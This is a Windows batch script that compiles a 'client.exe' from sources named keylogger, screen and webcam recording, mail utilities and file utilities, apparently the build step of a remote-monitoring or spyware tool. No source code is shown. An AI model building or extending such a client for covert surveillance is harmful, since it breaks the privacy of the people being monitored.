@echo off

echo [*] Compiling client...
g++ ../sources/client.cpp ^
    ../sources/process_utils.cpp ^
    ../sources/keylogger.cpp ^
    ../sources/restart.cpp ^
    ../sources/shutdown.cpp ^
    ../sources/screen_capture.cpp ^
    ../sources/camera_utils.cpp ^
    ../sources/screen_record.cpp ^
    ../sources/list_apps.cpp ^
    ../sources/mail_utils.cpp ^
    ../sources/file_utils.cpp ^
    ../sources/webcam_record.cpp ^
    -I"C:/msys64/ucrt64/include/opencv4" ^
    -L"C:/msys64/ucrt64/lib" ^
    -lopencv_core -lopencv_imgproc -lopencv_highgui -lopencv_videoio ^
    -lopencv_imgcodecs -lopencv_video -lopencv_objdetect ^
    -o client.exe ^
    -lws2_32 -lgdi32 -luser32 -lvfw32

echo [*] Compilation completed.
pause